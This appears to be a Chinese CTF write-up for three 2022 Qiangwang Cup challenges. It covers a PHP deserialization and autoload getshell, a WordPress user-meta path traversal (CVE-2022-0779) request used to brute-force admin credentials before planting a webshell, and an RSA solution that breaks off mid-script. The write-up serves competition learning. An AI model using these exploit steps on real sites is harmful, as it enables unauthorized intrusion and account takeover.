{"title":"强网杯2022","uid":"a6ba9e79ebbec5d852da03b23e7284e1","slug":"强网杯2022","date":"2022-07-29T15:44:33.000Z","updated":"2023-10-12T03:51:51.787Z","comments":true,"path":"api/articles/强网杯2022.json","keywords":null,"cover":"https://cover.png","content":"<h3 id=\"强网先锋\"><a href=\"#强网先锋\" class=\"headerlink\" title=\"强网先锋\"></a>强网先锋</h3><h4 id=\"farcefile\"><a href=\"#farcefile\" class=\"headerlink\" title=\"farcefile\"></a>farcefile</h4><p>扫描到 <code>www.zip</code> ，通过测试发现</p>\n<ol>\n<li>检查后缀和 <code>content-type</code> ，文件名是随机字符串</li>\n<li>数据存储于 <code>cookie</code> 中，通过 <code>反序列化函数</code>  还原并显示<br>关键点在于 <code>config.inc.php</code> 文件中的 <code>spl_autoload_register()</code> 函数</li>\n</ol>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">spl_autoload_register</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">error_reporting</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">function</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">e</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">str</span><span style=\"color: #89DDFF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">htmlspecialchars</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">str</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">userfile </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">empty</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_COOKIE</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">userfile</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">])</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">?</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">[]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">unserialize</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_COOKIE</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">userfile</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">]);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">a href</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/index.php</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">Index</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">a href</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/showfile.php</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">files</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p><code>spl_autoload_register()</code>如果不指定处理用的函数，就会自动包含 <code>类名.php</code> 或 <code>类名.inc</code> 的文件，并加载其中的 <code>类名</code> 类<br>通过源码看到黑名单中没有 <code>.inc</code> ，所以我们可以通过 <code>.inc</code> 文件来实现Getshell </p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">blackext </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">php</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">php5</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">php3</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">html</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">swf</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">htm</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">phtml</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">];</span></span></code></pre></div><p>我们可以看到上传后，响应包里出现了一段 <code>userfile</code> 的 <code>cookie</code></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">Set-Cookie:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">userfile=a:1:&#123;i:0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #FFCB6B\">s:36:</span><span style=\"color: #FFCB6B\">&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19.inc&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">&#125;</span></span></code></pre></div><p><img src=\"/./images/2.png\" alt=\"2\"></p>\n<p>然后我们序列化一个类名为 <code>340d9b3c0f5d7eff1c077d2ecd8c1c19</code> 的对象 </p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php </span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">class</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">340</span><span style=\"color: #BABED8\">d9b3c0f5d7eff1c077d2ecd8c1c19</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">flag </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">new</span><span style=\"color: #BABED8\"> 340</span><span style=\"color: #FFCB6B\">d9b3c0f5d7eff1c077d2ecd8c1c19</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">echo</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">serialize</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">flag</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">// O:32:&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19&quot;:0:&#123;&#125;</span></span></code></pre></div><p>直接在 <code>c``ookie</code> 中添加我们新生成的 <code>反序列化</code> 字符串即可<br><img src=\"/./images/3.png\" alt=\"3\"></p>\n<h4 id=\"WP-UM\"><a href=\"#WP-UM\" class=\"headerlink\" title=\"WP_UM\"></a>WP_UM</h4><p>访问环境，出现一个引导安装页面，感觉有用的信息就是下面这段</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>猫哥最近用wordpress搭建了一个个人博客，粗心的猫哥因为记性差，所以把管理员10位的账号作为文件名放在&#x2F;username下和15位的密码作为文件名放在&#x2F;password下。<br>并且存放的时候猫哥分成一个数字(作为字母在密码中的顺序)＋一个大写或小写字母一个文件，例如admin分成5个文件，文件名是1a 2d 3m 4i 5n<br>这几天他发现了一个特别好用的wordpress插件，在他开心的时候，可是倒霉的猫哥却不知道危险的存在。<br>这段信息说插件有问题，然后题目附件里发现就俩插件 <code>akismet</code> 和 <code>user-meta</code> </p></blockquote>\n<p>根据 <code>user-meta</code> 插件的版本 <code>2.4.3</code> 搜到了一个路径遍历漏洞 <code>CVE-2022-0779</code>，正好可以组合起来得到账号密码。</p>\n<p>请求包里的 <code>pf_noncee</code> 需要改成当前 <code>pf_noncee</code> ，获取方法：在网站首页查看页面源代码，搜索 <code>pf_nonce</code> 即可</p>\n<div class=\"language-http\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">http</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">POST</span><span style=\"color: #BABED8\"> /wp-admin/admin-ajax.php </span><span style=\"color: #F78C6C\">HTTP</span><span style=\"color: #BABED8\">/</span><span style=\"color: #F78C6C\">1.1</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Host</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">eci-2ze2ahooasrbklrp7npz.cloudeci1.ichunqiu.com</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Upgrade-Insecure-Requests</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">1</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">User-Agent</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Accept</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Accept-Encoding</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">gzip, deflate</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Accept-Language</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">zh-CN,zh;q=0.9</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Connection</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">close</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Content-Type</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">application/x-www-form-urlencoded</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">Content-Length</span><span style=\"color: #F78C6C\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">159</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">field_name=test&amp;filepath=/../../../../../../../../username/1M&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=e74a0c7bd4&amp;is_ajax=true</span></span></code></pre></div><p>我们可以发现，如果路径存在那么会有一个 <code>Remove</code> 反之没有<br><img src=\"/./images/4.png\" alt=\"4\"></p>\n<p>账号( <code>10</code> 位)密码( <code>15</code> 位)，这些信息题目提都提到了，我们直接 <code>burp</code> 爆破 <code>a-z</code> , <code>A-Z</code> 即可，另外博客文章内泄露了用户名，同时爆破的时候发现第一位是 <code>M</code> 简单猜测了几位，所以说实际上只爆破了密码的第 <code>6</code> 位到第 <code>15</code> 位，还是挺快的。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">用户名：MaoGePaMao</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">密码：MaoGeYaoQiFeiLa</span></span></code></pre></div><p>登录后台，<code>外观</code> -&gt; <code>主题文件编辑器</code> 处写shell (本意是直接写一句话，但是好像过滤了引号)，直接写个一句话到其他文件吧)<br><img src=\"/./images/5.png\" alt=\"5\"></p>\n<p>他说 <code>flag</code> 藏起来了，连上蚁剑翻了半天，最后发现在 <code>/usr/local/This_1s_secert</code> </p>\n<p><img src=\"/./images/6.png\" alt=\"6\"></p>\n<h4 id=\"ASR\"><a href=\"#ASR\" class=\"headerlink\" title=\"ASR\"></a>ASR</h4><p>下载附件得到一个 <code>python</code> 脚本</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> Crypto</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">Util</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">number </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> getPrime</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> secret </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> falg</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">pad </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">lambda</span><span style=\"color: #BABED8\"> </span><span style=\"color: #BABED8; font-style: italic\">s</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\">s </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">bytes</span><span style=\"color: #89DDFF\">([(</span><span style=\"color: #82AAFF\">len</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">s</span><span style=\"color: #89DDFF\">)-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">)%</span><span style=\"color: #F78C6C\">16</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">]*((</span><span style=\"color: #82AAFF\">len</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">s</span><span style=\"color: #89DDFF\">)-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">)%</span><span style=\"color: #F78C6C\">16</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">n </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">getPrime</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">128</span><span style=\"color: #89DDFF\">)**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">getPrime</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">128</span><span style=\"color: #89DDFF\">)**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">getPrime</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">128</span><span style=\"color: #89DDFF\">)**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">getPrime</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">128</span><span style=\"color: #89DDFF\">)**</span><span style=\"color: #F78C6C\">2</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">e </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">flag </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">pad</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">flag</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">flag</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">assert</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">len</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">flag</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&gt;=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">48</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">m </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">int</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">from_bytes</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">flag</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">big</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">c </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">pow</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">m</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">e</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">n</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #C792EA\">f</span><span style=\"color: #C3E88D\">&#39;n = </span><span style=\"color: #F78C6C\">&#123;</span><span style=\"color: #82AAFF\">n</span><span style=\"color: #F78C6C\">&#125;</span><span style=\"color: #C3E88D\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #C792EA\">f</span><span style=\"color: #C3E88D\">&#39;e = </span><span style=\"color: #F78C6C\">&#123;</span><span style=\"color: #82AAFF\">e</span><span style=\"color: #F78C6C\">&#125;</span><span style=\"color: #C3E88D\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #C792EA\">f</span><span style=\"color: #C3E88D\">&#39;c = </span><span style=\"color: #F78C6C\">&#123;</span><span style=\"color: #82AAFF\">c</span><span style=\"color: #F78C6C\">&#125;</span><span style=\"color: #C3E88D\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">&#39;&#39;&#39;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">e = 3</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">&#39;&#39;&#39;</span></span></code></pre></div><p>我们先用 <code>factordb</code> 把 <code>n</code> 分解一下，得到</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">p1</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">218566259296037866647273372633238739089</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">p2</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">223213222467584072959434495118689164399</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">p3</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">225933944608558304529179430753170813347</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">p4</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">260594583349478633632570848336184053653</span></span></code></pre></div><p> <code>e|p1-1|p3-1</code>，需要代替，进行一些尝试得出 <code>n</code> 也可以近似等于 <code>p2**2*p4**2</code></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> gmpy2</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> Crypto</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">Util</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">number </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> long_to_bytes</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">n </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">e </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">c </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p1 </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">218566259296037866647273372633238739089</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p2 </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">223213222467584072959434495118689164399</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p3 </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">225933944608558304529179430753170813347</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p4 </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">260594583349478633632570848336184053653</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">assert</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">n</span><span style=\"color: #89DDFF\">==(</span><span style=\"color: #BABED8\">p1</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">p2</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">p3</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">p4</span><span style=\"color: #89DDFF\">)**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">data </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> gmpy2</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">invert</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">e</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">p2</span><span style=\"color: #89DDFF\">-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">)*</span><span style=\"color: #82AAFF\">p2</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\">p4</span><span style=\"color: #89DDFF\">*(</span><span style=\"color: 